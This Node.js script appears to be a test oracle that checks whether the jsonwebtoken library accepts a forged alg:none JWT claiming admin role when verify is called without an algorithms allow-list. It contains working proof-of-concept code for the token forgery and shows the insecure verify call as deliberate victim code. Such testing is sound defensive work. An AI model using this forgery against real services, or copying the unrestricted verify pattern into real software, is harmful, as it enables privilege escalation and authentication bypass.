'use strict';
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

try {
  const marker = 'jwt_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);

  // Simulate a server that signs tokens with HS256 using a secret string.
  const secret = 'super-secret-' + marker;

  // --- Benign operation: sign and verify a token with HS256 explicitly ---
  const payload = { marker, user: 'alice', role: 'user' };
  const legitToken = jwt.sign(payload, secret, { algorithm: 'HS256' });

  const verifiedBenign = jwt.verify(legitToken, secret, { algorithms: ['HS256'] });

  if (!verifiedBenign || verifiedBenign.marker !== marker || verifiedBenign.role !== 'user') {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign HS256 sign/verify did not produce expected payload' });
    process.exit(0);
  }

  // Benign operation succeeded.
  const operation_completed = true;

  // --- Malicious operation: alg:none forged token ---
  // Attacker crafts a token with header {"alg":"none"} and no signature,
  // claiming elevated privileges. If the victim calls jwt.verify() with
  // only the secret and without an explicit `algorithms` allow-list
  // (the historically insecure default pattern used by many apps on
  // jsonwebtoken 8.5.1 and earlier when passing a `secretOrPublicKey`
  // that is "falsy-looking" misuse is not needed here: the alg:none
  // bypass works whenever algorithms isn't restricted and the attacker
  // supplies alg:none with no signature), the forged token is accepted.
  const header = { alg: 'none', typ: 'JWT' };
  const forgedPayload = { marker, user: 'attacker', role: 'admin' };

  function base64url(obj) {
    return Buffer.from(JSON.stringify(obj)).toString('base64')
      .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  }

  const forgedToken = base64url(header) + '.' + base64url(forgedPayload) + '.';

  let forgedVerified = null;
  let blocked = false;
  let errMessage = '';
  try {
    // Victim code calls verify with the secret but no explicit algorithms
    // restriction - mirrors common insecure real-world usage.
    forgedVerified = jwt.verify(forgedToken, secret);
  } catch (err) {
    blocked = true;
    errMessage = err && err.message ? err.message : String(err);
  }

  let exploit_succeeded = false;
  let evidence;

  if (!blocked && forgedVerified && forgedVerified.marker === marker && forgedVerified.role === 'admin') {
    exploit_succeeded = true;
    evidence = 'Algorithm confusion succeeded: alg:none forged token (no signature) was accepted by jwt.verify(), granting role=' + forgedVerified.role;
  } else if (blocked) {
    exploit_succeeded = false;
    evidence = 'Malicious alg:none forged token was rejected: ' + errMessage;
  } else {
    exploit_succeeded = false;
    evidence = 'Forged token was not accepted but no exception was thrown; unexpected result: ' + JSON.stringify(forgedVerified);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (err) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err)) });
}
